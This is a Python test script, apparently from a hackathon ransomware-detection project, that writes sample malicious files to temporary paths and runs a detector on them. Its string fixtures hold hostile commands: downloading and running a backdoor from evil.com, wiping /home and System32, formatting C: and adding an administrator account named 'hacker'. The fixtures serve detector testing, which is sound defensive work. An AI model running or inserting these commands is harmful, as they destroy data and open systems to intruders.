#!/usr/bin/env python3
"""
Test de lecture de fichiers malveillants
RansomGuard AI - Hackathon Togo IT Days 2025
"""

import os
import sys
import tempfile
import asyncio
from pathlib import Path

# Ajouter le répertoire parent au path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from ml_engine.ultra_detector import UltraDetector

async def test_file_reading():
    """Test de lecture de différents types de fichiers"""
    
    print("🔍 Test de lecture de fichiers malveillants")
    print("=" * 50)
    
    # Créer des fichiers de test
    test_files = {
        'python_malware.py': '''
import os
import subprocess
import base64

# Code malveillant Python
encoded_payload = "ZWNobyAiaGVsbG8gd29ybGQi"  # echo "hello world"
decoded = base64.b64decode(encoded_payload)
exec(decoded)

# Autres patterns malveillants
os.system("rm -rf /tmp/*")
subprocess.call(["wget", "http://evil.com/payload"])
''',
        
        'javascript_malware.js': '''
// Code malveillant JavaScript
var encoded = "ZWNobyAiaGVsbG8i";  // echo "hello"
eval(atob(encoded));

// Patterns suspects
setTimeout(function() {
    document.write("<script src='http://evil.com/malware.js'></script>");
}, 1000);

// Évaluation dynamique
var code = "alert('malware')";
Function(code)();
''',
        
        'batch_malware.bat': '''
@echo off
REM Script batch malveillant
del /s /q C:\\Windows\\System32\\*
format C: /q /y
net user hacker password /add
net localgroup administrators hacker /add
''',
        
        'shell_malware.sh': '''
#!/bin/bash
# Script shell malveillant
rm -rf /home/*
wget http://evil.com/backdoor -O /tmp/backdoor
chmod +x /tmp/backdoor
/tmp/backdoor &
''',
        
        'c_malware.c': '''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Code C malveillant
int main() {
    // Patterns suspects
    system("rm -rf /tmp/*");
    system("wget http://evil.com/payload");
    
    // Création de processus
    fork();
    exec("/bin/sh");
    
    return 0;
}
''',
        
        'binary_test.bin': b'\x4D\x5A\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00' + 
                          b'\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00' +
                          b'CreateProcess\x00ShellExecute\x00VirtualAlloc\x00WriteProcessMemory\x00'
    }
    
    detector = UltraDetector()
    
    for filename, content in test_files.items():
        print(f"\n📁 Test: {filename}")
        print("-" * 30)
        
        # Créer le fichier temporaire
        with tempfile.NamedTemporaryFile(mode='wb' if isinstance(content, bytes) else 'w', 
                                       delete=False, suffix=os.path.splitext(filename)[1]) as f:
            if isinstance(content, bytes):
                f.write(content)
            else:
                f.write(content)
            temp_path = f.name
        
        try:
            # Détecter le type de fichier
            file_type = detector._detect_file_type(temp_path)
            print(f"✅ Type détecté: {file_type['language']} (binaire: {file_type['is_binary']})")
            
            # Analyser le fichier
            if file_type['is_binary']:
                result = await detector._analyze_binary_ultra(temp_path, file_type)
            else:
                result = await detector._analyze_script_ultra(temp_path, file_type)
            
            # Afficher les résultats
            print(f"📊 Méthode d'analyse: {result.get('analysis_method', 'unknown')}")
            
            # Patterns trouvés
            patterns = result.get('patterns_analysis', {})
            if patterns:
                found_patterns = patterns.get('found_patterns', [])
                print(f"🔍 Patterns malveillants trouvés: {len(found_patterns)}")
                for pattern in found_patterns[:3]:  # Afficher les 3 premiers
                    print(f"  - {pattern.get('pattern', 'Unknown')}: {pattern.get('matches', 0)} matches")
            
            # Obfuscation
            obfuscation = result.get('obfuscation_analysis', {})
            if obfuscation.get('indicators'):
                print(f"🚨 Obfuscation détectée: {', '.join(obfuscation['indicators'])}")
            
            # Code encodé
            encoded = result.get('encoded_analysis', {})
            if encoded.get('indicators'):
                print(f"🔐 Code encodé détecté: {', '.join(encoded['indicators'])}")
            
            # Strings suspectes
            strings_analysis = result.get('strings_analysis', {})
            if strings_analysis:
                suspicious = strings_analysis.get('suspicious_strings', [])
                print(f"⚠️ Strings suspectes: {len(suspicious)}")
                for string in suspicious[:3]:  # Afficher les 3 premières
                    print(f"  - {string}")
            
            print("✅ Analyse terminée")
            
        except Exception as e:
            print(f"❌ Erreur lors de l'analyse: {e}")
        
        finally:
            # Nettoyer
            if os.path.exists(temp_path):
                os.unlink(temp_path)
    
    print("\n🎯 Test terminé !")
    print("\n📋 Résumé des capacités:")
    print("✅ Lecture de fichiers Python (.py)")
    print("✅ Lecture de fichiers JavaScript (.js)")
    print("✅ Lecture de scripts batch (.bat)")
    print("✅ Lecture de scripts shell (.sh)")
    print("✅ Lecture de code C (.c)")
    print("✅ Analyse de binaires (.exe, .dll, etc.)")
    print("✅ Détection de patterns malveillants")
    print("✅ Détection d'obfuscation")
    print("✅ Détection de code encodé")
    print("✅ Extraction de strings suspectes")

if __name__ == "__main__":
    asyncio.run(test_file_reading())
